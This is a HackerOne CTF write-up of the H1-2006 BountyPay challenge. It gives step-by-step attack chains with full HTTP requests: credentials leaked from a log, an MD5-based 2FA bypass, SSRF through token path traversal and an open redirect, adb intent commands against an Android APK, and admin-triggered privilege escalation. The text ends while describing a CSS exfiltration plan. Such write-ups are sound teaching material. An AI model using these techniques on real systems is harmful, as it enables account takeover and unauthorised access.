# [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community

## Report Details
- **Report ID**: 892337
- **URL**: https://hackerone.com/reports/892337
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-05T19:40:57.624Z
- **Disclosed**: 2020-06-18T15:29:59.325Z

## Reporter
- **Username**: sturedman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# H1-2006  CTF Writeup
This is a story about both solving a CTF and, most importantly, on how to make friends during the journey and learn a lot a valuable things for the future.

On a Friday evening I saw this tweet from HackerOne:
{F853545}

Honestly, last CTF was really hard so I didn't really thought about actually completing this one too, and I still think Live Hacking Events will likely be just a dream for at least some years.

But yeah, we are hackers and when we see a CTF we want to at least try solving it, right? 

So, a couple of days later (also hackers enjoy taking some beers with friends on the weekend after all) I started playing on the CTF and following are explained all the steps that I took to (unexpectedly) finish it.

## Infographic
The following infographic illustrates the steps taken in my solution (totally inspired by @manoelt).
{F856596}


## CTF Creators
Something that really catched my eyes was that the CTF Creators were known to me. 
Indeed I already was following both of them on Twitter, Adam (@adamtlangley) & Kyle (@B3nac)!
{F853559}

This was very useful for 3 reasons:
1. Now I knew that Android challenges would be likely as B3nac was involved
2. As I have solved all the challenges created by Adam on *ctfchallenge.co.uk*, I would have been slightly advantaged as I already knew how he typically creates them. Sorry Adam :D
3. I just knew that this time I could do it!


## Recon
As @nahamsec teached me during his live streams, target recon is a huge part of a security assessment and it is usually the first thing I do when I am on a new target.

Indeed, the main CTF URL was:
- https://bountypay.h1ctf.com/

...and there was nothing on it but two login forms!
{F853574}

So, I launched my custom recon script on domain `bountypay.h1ctf.com` to see if there were other interesting subdomains as that's usually the case.
Indeed, I found the following subdomains:
- app.bountypay.h1ctf.com (Customer login above)
- staff.bountypay.h1ctf.com (Staff login above)
- api.bountypay.h1ctf.com (**New!**)
- software.bountypay.h1ctf.com (**New!**)

As said before, the first two are simple login forms, so let's take a look at the others two.

### api.bountypay.h1ctf.com

{F853600}

As the name said, this will surely host all the application APIs, so surely I will have to enumerate all of them (more of this later).
Apart from that, I saw a clear Open Redirect on the link displayed:
- https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API

An Open Redirect is a vulnerability by itself as it could be also leveraged for phishing but it could be also escalated through an SSRF and that was my idea at that time.

### software.bountypay.h1ctf.com

{F853606}

That's interesting as we can see a 401 Forbidden with a note that basically says that we have to use a whitelisted IP address...and that could be surely connected with the possible SSRF found before in order to bypass this restriction!

## Ffufing everything
So next step involved continuing recon phase by finding if there were hidden files or directories in all the subdomains.
I used the following command and a custom wordlist after having used the *common.txt* one: 
`ffuf -u [HOSTS]/FUZZ -t 400 -w $WORDLIST`

I found that on https://api.bountypay.h1ctf.com/api/ there was the *staff* endpoint that resulted in the following 401 error message:
- `["Missing or invalid Token"]`

This surely will be useful later...

Then I found that on https://app.bountypay.h1ctf.com host there were some accessible *Git* contents:
- https://app.bountypay.h1ctf.com/.git/index
- https://app.bountypay.h1ctf.com/.git/HEAD
- https://app.bountypay.h1ctf.com/.git/config

In particular, the *.git/config* file contained a reference to a BountyPay related Github repository (https://github.com/bounty-pay-code/request-logger.git):

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## Git exploitation
By accessing the only file exposed, https://github.com/bounty-pay-code/request-logger/blob/master/logger.php, 
I noticed a line surely worth of interest:
```
file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
``` 

So, it seems that there is an interesting file that we have to access!

The content of *bp_web_trace.log*, accessible at https://app.bountypay.h1ctf.com/bp_web_trace.log had the following content:
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

As we can see from the code on Github, these are timestamps followed by Base64 encoded strings that, once decoded for example with Burp Decoder, represent:
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

So...great, we have the credentials for a new user called **Brian Oliver**!

Let's try to use those credentials on the login form on https://app.bountypay.h1ctf.com as I found those in that domain.

{F853852}

Damn! We have also to insert a 2FA code.

Let's take a look at the related 2FA POST request:
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=brian.oliver&password=V7h0inzX&challenge=70fc6bcd3409b8acaec02992d31b4d03&challenge_answer=xxxxxxxx
```

So, I noticed that I need also a *challenge* and a *challenge_answer*.
The latter one could be found in one of the Base64 decoded string:
- `bD83Jk27dQ`

But how can I find the correct challenge?

First of all, I noticed that the *challenge* was likely to be an MD5 hash.
{F853860}

So I tried the most obious thing: "What if the *challenge* value (**5828c689761cce705a1c84d9b1a1ed5e**) is nothing more than the MD5 of the *challenge_answer* (**bD83Jk27dQ**)?"

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

Whoaaaa, that's right! We are logged in as Brian Oliver!
{F853862}

Actually, what I then found out is that no matter which *challenge_answer* you insert, it is just enough that the *challenge* is the MD5 of that, and this will be useful later.

## SSRF to Android APK
Ok so, what can we do as Brian Oliver?
Not so much apparently as all the transactions seem to be empty :(

At this point I took a look at my Burp History and noticed that after login the server set for us what appears to be a JWT Token `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` that when Base64 decoded resulted to be like this:
- `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`

So there is an accountID and a hash.
Let's search these values in our Burp History to check if they were maybe already appeared somewhere else.

Mmm...that's interesting. The *account_id* value is present in the response to the following GET request related to the loading of specific transactions like https://app.bountypay.h1ctf.com/statements?month=01&year=2020:
{F853868}

However, by directly trying to request the API https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020 we receive an error: *["Missing or invalid Token"]*.
So, it appears that in order to use APIs we have to first obtain a valid token, so that's not the way for now.

So, after brainstorming a series of "What if?" (that's the job of an hacker, after all :D ) I thought:
- "What if I try to manipulate the accountID and see what happens?"

So, for example, by modifying the *account_id* to *test*:
```
GET /statements?month=03&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoidGVzdCIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```
We can see that the *account_id* value is used to construct the related API URL.
```
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/test\/statements?month=03&year=2020","data":"[\"Invalid Account ID\"]"}
```

At this point we could request any path on the api.bountypay.h1ctf.com domain...and what we have on that? Ah sure, the possible SSRF! 

So combining all the previous ideas I obtained the following JWT Token:
- `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tLyMvIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=`

That is:

- 
`{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}
`

Indeed, this seems to be successful as it returns what it seems a login form:
```
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"
}
```

However...we don't have any new credentials to use!

### BurpSuite-Fu
So at this point I tried to find if there are some hidden directories or files only accessible through SSRF (as the ffuf done before resulted in an error as my IP was not in whitelist).

I did this through the use of some slightly unknown Burp Intruder options.

My basic setup was the following:
{F854063}

The wordlist I used is the *common.txt* from SecLists (https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt).

Then the trick I used was to set 3 *Payload Processing* steps:
1. Set a "prefix" as `{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/`
2. Set a "suffix" as `/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}`
3. Apply Base64 Encoding to all of this

{F854067}

This basically automates the search while also applying the right encoding.

This way I quickly find that a correct *token* value is this:
```
eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHMvIy8iLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
```
which represents
```
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/uploads/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

At the *uploads* path there was a Directory Listing where it was clear that an APK could be downloaded.

```
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads\/#\/\/statements?month=03&year=2020",
    "data": "<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"
}
```

Bingo!
So let's download that! 

## Solving all the Android flags
So, I downloaded the APK from the following URL:
- https://software.bountypay.h1ctf.com/uploads/BountyPay.apk

Note that for solving all the expected flags, I used an old Nexus that I purchased years ago, but you could have also used an emulator like Genymotion.

Also, for obtain the source code of an Android application, starting from the APK, I usually use **Jadx** (https://github.com/skylot/jadx) as it is really good for the purpose.

My approach to these series of challenges was the following:
1. Load the activity on my Android device
2. Check the related code on Jadx

So...let's start!


### MainActivity

This is actually loaded at first start of the application and it is used just to create a username and a Twitter handler. Nothing to see here.

### PartOneActivity
This is just a blank activity (like all the following ones).
And this is the related code retrieved.
{F854087}

As my objective was to call the *logFlagFound()* method, I needed to find a way to make *true* this statement:
```
if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")) {
```

It is easy to see that this involves using an *Intent* and sending specific *Intent data* following the requirements specified.

So I solved this first step by using **adb** to send an Intent to this Activity (make sure to run *adb devices* first to check if the real or virtual device is correctly recognized):
```
adb shell am start -a android.intent.action.VIEW -d "?start=PartTwoActivity" bounty.pay/bounty.pay.PartOneActivity
```

### PartTwoActivity
This was similar to the previous one but involved two different steps:
1. Make visible all the elements of the Activity
2. Send specific Intent Data like before

So, I solved the first step with:
```
adb shell am start -a android.intent.action.VIEW -d "?two=light\&switch=on" bounty.pay/bounty.pay.PartTwoActivity
```

And the second one by submitting `X-Token` in the text label.
Indeed, the hash displayed is a MD5 represting the word *Token* that must be concatenated with *X-*:

{F854101}

```
if (str.equals("X-" + ((String) dataSnapshot.getValue()))) {
```

The real issue with this step was that I didn't remember that I had to use *\* to escape the *&* character.


### PartThreeActivity

This involved again two steps:
1. Make visible all the elements of the Activity
2. Retrieve the X-Token value that is going to be useful later

I solved the first step with this command:
```
adb shell am start -a android.intent.action.VIEW -d "?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" bounty.pay/bounty.pay.PartThreeActivity
```

And then I found the Leaked Hash saved in _/data/data/bounty.pay/shared_prefs/user_created.xml_:
```
 <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
```

Note that this was the expected solution if you have a rooted Android device.
Otherwise you could find the same information in logs through `adb logcat`:
{F854103}

So by inserting this value in the text label I finally solved all the Android challenges!

Wooooooow!

And to celebrate I tweeted this:

{F854107}

So, thanks again B3nac!

## Logging to staff as Sandra
So...back to web stuff!

The last Android activity said that some information achieved there could be useful for next challenges.
So at this point it was clear (having also solved all the Adam challenges...) that we were talking about the *X-Token* header:
- `X-Token: 8e9998ee3137ca9ade8f372739f062c1`

Where could I use that?

Well, during recon I found that https://api.bountypay.h1ctf.com/api/staff API endpoint was missing the right token, so that seemed to me the best idea.
So I tried the following GET request that returned some interesting results:
```
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://api.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

```
[{
    "name": "Sam Jenkins",
    "staff_id": "STF:84DJKEIP38"
}, {
    "name": "Brian Oliver",
    "staff_id": "STF:KE624RQ2T9"
}]
```

Two **staff_id**!

So I quickly tried something like that to use both these values:
`https://api.bountypay.h1ctf.com/api/staff?staff_id=STF:84DJKEIP38`

Mmm...same answer.
But what about a POST request?

`["Staff Member already has an account"]`

That's interesting! Unfortunately also the other staff_id returned nothing useful so honestly at this point I was stuck.

Then the following hint tweet came:
{F856245}

So let's look at this Twitter account!

Basically after some simple searches on that I found in the **Following** the account of Sandra (@SandraA76708114) that contained a photo with a new different *staff_id*...exactly what I was searching!
{F856255}

So, now trying the following request:
```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://api.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```

We found **Sandra credentials**!
```
{
    "description": "Staff Member Account Created",
    "username": "sandra.allison",
    "password": "s%3D8qB8zEpMnc*xsz7Yp5"
}
```

As this was realted to staff, I tried to use these credentials on https://staff.bountypay.h1ctf.com/?template=login and finally reached to be logged in as Sandra.
{F856259}


## Privilege Escalation from Sandra to Marten
So in my head now the plan was to escalate from Sandra to Marten and then make the May bounty payment.
At first I thought this could be done in just one step but I was wrong :)

So...how can I escalate my privilege from a simple member of staff to a CEO?

By looking at the application I found this especially interesting JavaScript file at https://staff.bountypay.h1ctf.com/js/website.js:
```
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

That *upgradeToAdmin* surely seemed my target.

This was when collaboration really started but I dedicate a later chapter to that.

So, by taking a brief revision of my jQuery knowledge, this syntax:
```
$(".upgradeToAdmin").click(function()
```
Means that the function I am interested in is triggered once one (or more) element with HTML attribute *class="upgradeToAdmin"* is clicked.

This is the way how it also works the *Send Report* functionality:
```
$(".sendReport").click(function() {
```
Indeed, the API call is made once clicked on an element, in this case a button, which hash the HTML attribute *class="sendReport"*
{F856318}

However, as in this case there was no element with class "upgradeToAdmin", I considered I had to create that by myself.

Then I found other two important points:
1. The related API call */admin/upgrade?username=* must be done as an Admin
2. We have to pass also the username of the user we want to upgrade

For solving the first point I tried to find a feature that could have been reviewed also by an Admin.
The *Send Report* function seemed to be the most likely to try.

For solving the second point I searched for an input element with a name attribute equals to *username* and I found it on the login form (https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison):
```
let t = $('input[name="username"]').val();
```
{F856329}

So, at this point I had to find a way to create an element with *class="upgradeToAdmin"*.

Thus I found that I could edit the class attribute of the profile avatar through the following POST request in the *profile_avatar* body parameter:
```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://staff.bountypay.h1ctf.com/?template=home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH

profile_name=sandra&profile_avatar=upgradeToAdmin
```

The new class could be retrieved when looking at Sandra avatar in the "Support Tickets" section at https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582:
{F856347}

Now I had to connect the dots and found a way to have both reachable at the same time the *login* template and the *ticket* one.

At first I tried something like this but nothing happened:
`https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582&template=login&username=sandra.allison`

Then, after countless attempts, I found that I could use **multi array** for having both two templates at the same time!
`https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison`

{F856350}

So now I had to find a way to make sure that the admin will click on the correct element and trigger the request.
For doing this we can leverage this piece of code belonging to the same JavaScript seen before:
```
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

Basically we can add a new "class" *tab1* that would be clicked if the related *#tab1* hash is present in the URL thus triggering also the click on *upgradeToAdmin*.

So I changed again my avatar:
```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://staff.bountypay.h1ctf.com/?template=home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHb2lxaC9mWlFkZmNpdWZDVmJVNnNLOHFLT0svRkJSY0MwNTcyMEs4c1lyUzE3UT09

profile_name=sandra&profile_avatar=tab1 upgradeToAdmin
```

And now by requesting this:
`https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab1`

We see that the request that I want was effectively executed although with a 401 status code in response. But that's ok as I already know how to bypass that!
{F856389}

So at this point I just simply reported this page, including also the *#tab1* in the Base64:
`https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjE=`

Then when I reloaded the homepage I could see that a new *Admin tab* was added...yeah!!!

{F856399}


## Paying the May Bounty

From the *Admin* tab I could find Marten's credentials and I thought that was the end...how silly I was! :D

{F856409}

So I tried to first insert these credentials in staff.bountypay.h1ctf.com and then I tried in app.bountypay.h1ctf.com and finally they worked.
At this point then I bypassed the 2FA challenge just by using an arbitrary *challenge_answer* and the related MD5 for the *challenge*:
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 123
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=098f6bcd4621d373cade4e832627b4f6&challenge_answer=test
```

So at this point I rushed to loading the May transactions:
{F856420}

Then I clicked on pay and...damn! Another **2FA** challenge and we have just 2 minutes to insert the right code! I am starting to hate them :D

{F856421}

The "Send challenge" request was the following:
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.0 Safari/537.36 autochrome/blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

And it seemed to load a CSS (https://www.bountypay.h1ctf.com/css/uni_2fa_style.css) that is used in the first screen:
```
<input type="hidden" name="app_style" value="https://www.bountypay.h1ctf.com/css/uni_2fa_style.css">
```

Honestly I didn't really know what to think other than I would have likely try to load a CSS file that would try to exfiltrate the right code in less than 2 minutes!
That's when collaboration was on the rescue again to help me create a valid CSS for the purpose.

Also, while searching for CSS exfiltration on Google I found this great article by @d0nut which was very helpful:
- `https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b`

For now I knew that the code was of **length 7**.
{F856481}

And that I had to know which was the valid code value (the right one was **code_1**, **code_2**, etc).

So at the end I used this CSS file and loaded that on my web server then passing that URL to the previous request.

In case the code character was valid I would see on my logs which was that character and at which position must be inserted. 
